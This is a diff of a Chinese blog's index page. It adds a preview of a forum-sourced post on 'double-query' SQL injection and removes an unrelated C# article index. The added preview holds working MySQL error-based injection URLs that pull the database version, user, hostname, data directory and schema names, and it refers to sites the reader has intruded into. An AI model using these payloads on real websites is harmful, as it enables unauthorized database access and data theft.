@@ -224,6 +224,62 @@
           
           
             <article class="post-preview">
+              <a href="https://leizhiyuan.github.io/2013/02/22/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/">
+                <h2 class="post-title">双查询注入</h2>
+                
+                
+                
+              </a>
+
+              <span class="post-meta">
+  
+  
+  <i class="fas fa-calendar"></i>&nbsp;Posted on February 22, 2013
+  
+  
+    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;2&nbsp;minutes
+  
+  
+  
+    
+      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;bystander
+    
+  
+  
+</span>
+
+
+              <div class="post-entry">
+                
+                  作者：bystander 论坛：法客论坛 这个东西比较难解释。我就不多解释。尽量通过这篇文章大家能够照猫画虎手注即可。想要深入理解的可以去看看mysql数据库的一些知识
+介绍一下双查询注入，有时候我们通过order by 语句获取到了确定的列数，可是当我们使用union select或union select all查询的时候，
+f4ck.net/index.php?id=-1 union select 1,2,3,4,5,6-- 却会出现一个错误提示，列数不一致。
+Different Number of Columns 而我们使用下面的语句：
+f4ck.net/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(concat(version(),user(),@@hostname,0x7e,@@datadir) as char),0x7e)) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 执行之后就会显示mysql版本，用户名，服务器名, 以及数据目录…
+获取数据库里
+许多人会在上面的语句里使用:database()方法来获取数据库，
+f4ck.net/index.php?id=1 and (select 1 from (select count(*),concat((select(select concat(cast(database() as char),0x7e)) from information_schema.tables where table_schema=database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) 可是。这个方法只能获取一个数据库。如果你入侵的网站存在多个数据库。上面这个查询就不能用了因此使用下面这个方法更好些。。
+f4ck.net/index.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinct concat(0x7e,0x27,cast(schema_name as char),0x27,0x7e) FROM information_schema.
+                  <a href="https://leizhiyuan.github.io/2013/02/22/%E5%8F%8C%E6%9F%A5%E8%AF%A2%E6%B3%A8%E5%85%A5/" class="post-read-more">[Read More]</a>
+                
+              </div>
+
+              
+                <div class="blog-tags">
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E4%BA%92%E8%81%94%E7%BD%91/">互联网</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E5%AE%89%E5%85%A8/">安全</a>&nbsp;
+                  
+                    <a href="https://leizhiyuan.github.io//tags/%E7%BF%BB%E8%AF%91/">翻译</a>&nbsp;
+                  
+                </div>
+              
+            </article>
+          
+            <article class="post-preview">
               <a href="https://leizhiyuan.github.io/2013/02/21/%E4%BD%A0%E6%98%AF%E6%83%B3%E8%AF%BB%E4%B9%A6%E8%BF%98%E6%98%AF%E6%83%B3%E8%AF%BB%E5%AE%8C%E4%B9%A6/">
                 <h2 class="post-title">你是想读书，还是想读完书？</h2>
                 
@@ -899,112 +955,6 @@ DMA控制器通过在总线上发出一个读请求到磁盘控制器而发起DM
                     <a href="https://leizhiyuan.github.io//tags/%E5%BC%80%E5%8F%91/">开发</a>&nbsp;
                   
                     <a href="https://leizhiyuan.github.io//tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>&nbsp;
-                  
-                    <a href="https://leizhiyuan.github.io//tags/%E8%BD%AF%E4%BB%B6/">软件</a>&nbsp;
-                  
-                </div>
-              
-            </article>
-          
-            <article class="post-preview">
-              <a href="https://leizhiyuan.github.io/2013/01/27/c#-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E7%B3%BB%E5%88%97%E6%96%87%E7%AB%A0%E7%B4%A2%E5%BC%95/">
-                <h2 class="post-title">C# 基础知识系列文章索引</h2>
-                
-                
-                
-              </a>
-
-              <span class="post-meta">
-  
-  
-  <i class="fas fa-calendar"></i>&nbsp;Posted on January 27, 2013
-  
-  
-    &nbsp;|&nbsp;<i class="fas fa-clock"></i>&nbsp;1&nbsp;minutes
-  
-  
-  
-    
-      &nbsp;|&nbsp;<i class="fas fa-user"></i>&nbsp;bystander
-    
-  
-  
-</span>
-
-
-              <div class="post-entry">
-                
-                  <p>清理GR的加星标项目。分享来自博客园 <a href="http://www.cnblogs.com/zhili">zhili</a> 的C#基础系列文章。</p>
-
-<p>C#基础知识系列终于告了一个段落了, 本系列中主要和大家介绍了C#1.0到C# 4.0中一些重要的特性，刚开始写这个专题的初衷主要是我觉得掌握了C#这些基础知识之后，对于其他任何的一门语言都是差不多的，这样可以提高朋友们对其他语言的掌握，以及可以让大家更加迅速地掌握.NET的新特性， 并且相信这个系列对于找工作的朋友也是很有帮助的，因为很多公司面试都很看重基础知识是否扎实，是否对C#有一个全面的认识和理解，所以很多公司面试都会问到一些C#基础概念的问题，例如，经常面试会问：你是如何理解委托的，如何理解匿名函数等问题。</p>
-
-<p>然而这个系列中并没有介绍COM互操作性的内容以及.Net 4.5中的一些新特性，所以后面将会对这两个方面的内容进行补充，由于这个系列托的太久了(大概也有3个月吧)，所以就先告一段落的，后面将会带来.NET互操作性系列的介绍。下面就为这个系列文章做一个索引，方便大家收藏和查找。</p>
-
-<p>C#基础知识系列索引</p>
-
-<p>C#1.0</p>
-
-<p>1. <a href="http://www.cnblogs.com/zhili/archive/2012/10/22/Delegate.html">深入解析委托——C#中为什么要引入委托</a></p>
-
-<p>2. <a href="http://www.cnblogs.com/zhili/archive/2012/10/25/DeepDelegate.html">委托本质论</a></p>
-
-<p>3. <a href="http://www.cnblogs.com/zhili/archive/2012/10/27/MulticastDelegate.html">如何用委托包装多个方法——委托链</a></p>
-
-<p>4. <a href="http://www.cnblogs.com/zhili/archive/2012/10/27/Event.html">事件揭秘</a></p>
-
-<p>5. <a href="http://www.cnblogs.com/zhili/archive/2012/10/29/ButtonClickEvent.html">当点击按钮时触发Click事件背后发生的事情</a></p>
-
-<p>C# 2.0</p>
-
-<p>6. <a href="http://www.cnblogs.com/zhili/archive/2012/11/03/GenericType.html">泛型基础篇——为什么引入泛型</a></p>
-
-<p>7. <a href="http://www.cnblogs.com/zhili/archive/2012/11/08/Generic_1.html">泛型深入理解(一)</a></p>
-
-<p>8. <a href="http://www.cnblogs.com/zhili/archive/2012/11/08/Generic_2.html">泛型深入理解(二)</a></p>
-
-<p>9. <a href="http://www.cnblogs.com/zhili/archive/2012/11/12/GenericVari.html">深入理解泛型可变性</a></p>
-
-<p>10. <a href="http://www.cnblogs.com/zhili/archive/2012/11/23/Nullable.html">全面解析可空类型</a></p>
-
-<p>11. <a href="http://www.cnblogs.com/zhili/archive/2012/12/01/anonymousmethod.html">匿名方法解析</a></p>
-
-<p>12. <a href="http://www.cnblogs.com/zhili/archive/2012/12/02/Interator.html">迭代器</a></p>
-
-<p>C# 3.0</p>
-
-<p>13. <a href="http://www.cnblogs.com/zhili/archive/2012/12/11/basicfeatures.html">全面解析对象集合初始化器、匿名类型和隐式类型</a></p>
-
-<p>14. <a href="http://www.cnblogs.com/zhili/archive/2012/12/12/LambdaExpression.html">深入理解Lambda表达式</a></p>
-
-<p>15. <a href="http://www.cnblogs.com/zhili/archive/2012/12/17/ExtensionMethod.html">全面解析扩展方法</a></p>
-
-<p>16. <a href="http://www.cnblogs.com/zhili/archive/2012/12/24/Linq.html">Linq介绍</a></p>
-
-<p>C# 4.0</p>
-
-<p>17. <a href="http://www.cnblogs.com/zhili/archive/2013/01/07/DynamicType.html">深入理解动态类型</a></p>
-
-<p>&nbsp;</p>
-
-<p>从C#的所有特性可以看出,C#中提出的每个新特性都是建立在原来特性的基础上,并且是对原来特性的一个改进, 做这么多的改进主要是为了方便开发人员更好地使用C#来编写程序,是让我们写更少的代码来实现我们的程序,把一些额外的工作交给编译器去帮我们做,也就是很多人说微软很喜欢搞语法糖的意思(语法糖即让编译器帮我们做一些额外的事情，减少开发人员所考虑的事情，使开发人员放更多的精力放在系统的业务逻辑上面。)，大家从C# 3中提出的特性中可以很好的看出这点(指的是玩语法糖)，C#3中几乎大部分特性都是C#提供的语法糖，从CLR层面来说(指的是增加新的IL指令)，C# 3并没有更新什么，C# 4中提出的动态类型又是建立在表达式树的基础上，包括Linq也是建立在表达式树的基础上，所以每个特性都是层层递进的一个关系。相信C#后面提出的新特性将会更加方便我们开发程序，感觉所有语言的一个统一的思想都是——写更少的代码，却可以做更多的事情。但是我们不能仅仅停住于知道怎么使用它，我们还应该深入研究它的背后的故事，知道新特性是如何实现的和原理。用一句说就是——我们要知其然之气所以然，学习知识应该抱着刨根问底的态度去学习,<strong>相信这样的学习方式也可以让大家不感到心虚,写出的程序将会更加自信。</strong></p>
-
-                
-              </div>
-
-              
-                <div class="blog-tags">
-                  
-                    <a href="https://leizhiyuan.github.io//tags/c/">C＃</a>&nbsp;
-                  
-                    <a href="https://leizhiyuan.github.io//tags/windows/">windows</a>&nbsp;
-                  
-                    <a href="https://leizhiyuan.github.io//tags/%E5%A4%A7%E5%AD%A6/">大学</a>&nbsp;
-                  
-                    <a href="https://leizhiyuan.github.io//tags/%E5%BC%80%E5%8F%91/">开发</a>&nbsp;
-                  
-                    <a href="https://leizhiyuan.github.io//tags/%E6%94%B6%E8%97%8F/">收藏</a>&nbsp;
-                  
-                    <a href="https://leizhiyuan.github.io//tags/%E8%AE%BE%E8%AE%A1/">设计</a>&nbsp;
                   
                     <a href="https://leizhiyuan.github.io//tags/%E8%BD%AF%E4%BB%B6/">软件</a>&nbsp;
                   
